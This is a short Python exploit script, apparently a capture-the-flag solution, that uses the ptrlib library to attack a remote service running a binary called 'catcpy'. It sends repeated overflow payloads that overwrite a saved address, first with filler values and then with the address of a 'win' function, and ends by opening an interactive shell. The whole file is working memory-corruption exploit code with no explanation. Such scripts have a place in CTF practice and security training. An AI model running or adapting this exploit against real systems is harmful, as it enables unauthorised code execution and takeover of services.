from ptrlib import *

elf = ELF("./catcpy")

# sock = Process("./catcpy")
sock = Socket("nc 34.170.146.252 13997")

# 0xXXXXwin
sock.sendlineafter("> ", 1)
payload = b"S" * 0xFF
sock.sendlineafter("Data: ", payload)

sock.sendlineafter("> ", 2)
payload = b"A" * 0x19
payload += p64(0xAAAAAAAAAA)
sock.sendlineafter("Data: ", payload)

# 0x00XXwin
sock.sendlineafter("> ", 1)
payload = b"S" * 0xFF
sock.sendlineafter("Data: ", payload)

sock.sendlineafter("> ", 2)
payload = b"B" * 0x19
payload += p64(0xBBBBBBBB)
sock.sendlineafter("Data: ", payload)

# 0x0000win
sock.sendlineafter("> ", 1)
payload = b"S" * 0xFF
sock.sendlineafter("Data: ", payload)

sock.sendlineafter("> ", 2)
payload = b"C" * 0x19
payload += p64(elf.symbol("win"))  # 0x401256
sock.sendlineafter("Data: ", payload)

sock.sendlineafter("> ", 0)

sock.sh()
